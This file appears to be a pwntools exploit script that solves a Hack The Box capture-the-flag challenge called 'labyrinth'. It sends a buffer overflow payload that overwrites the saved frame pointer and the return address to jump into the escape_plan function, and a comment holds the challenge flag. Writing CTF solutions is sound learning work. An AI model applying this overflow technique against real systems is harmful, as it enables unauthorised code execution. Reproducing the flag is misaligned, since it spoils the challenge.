from pwn import *

elf=ELF("./labyrinth")
context(arch="amd64", os="linux")

stack=0x404100
# after printf call, since printf is special and doesn't like the weird stack pointer
inside_escape_plan=elf.symbols["escape_plan"]+ 0x5b


p=elf.process()
# p=remote("165.232.98.59", 30166)

p.sendline(b"69")

# read(0x44)
buffer=b"+"*0x30
payload=buffer
payload+=p64(stack)
payload+=p64(inside_escape_plan)

# input("attatched?")
p.sendline(payload)

p.interactive()
# HTB{3sc4p3_fr0m_4b0v3}
